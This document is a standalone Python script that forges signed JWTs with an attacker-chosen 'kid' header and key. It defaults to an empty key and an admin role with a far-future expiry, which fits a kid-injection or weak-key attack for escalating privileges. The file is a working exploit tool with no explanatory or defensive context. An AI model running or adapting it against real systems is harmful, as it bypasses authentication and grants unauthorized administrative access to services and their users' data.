#!/usr/bin/env python3
import hmac, hashlib, base64, json, sys, time, urllib.request

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge(kid, key, email, role, exp=2000000000):
    header = {"kid": kid, "typ": "JWT", "alg": "HS256"}
    payload = {"email": email, "role": role, "exp": exp}
    h = b64url(json.dumps(header)) + "." + b64url(json.dumps(payload))
    sig = hmac.new(key if isinstance(key, bytes) else key.encode(), h.encode(), hashlib.sha256).digest()
    return h + "." + b64url(sig)

if __name__ == "__main__":
    kid = sys.argv[1]
    key = sys.argv[2].encode().decode('unicode_escape').encode('latin1') if len(sys.argv) > 2 else b""
    email = sys.argv[3] if len(sys.argv) > 3 else "admin@example.com"
    role = sys.argv[4] if len(sys.argv) > 4 else "admin"
    print(forge(kid, key, email, role))
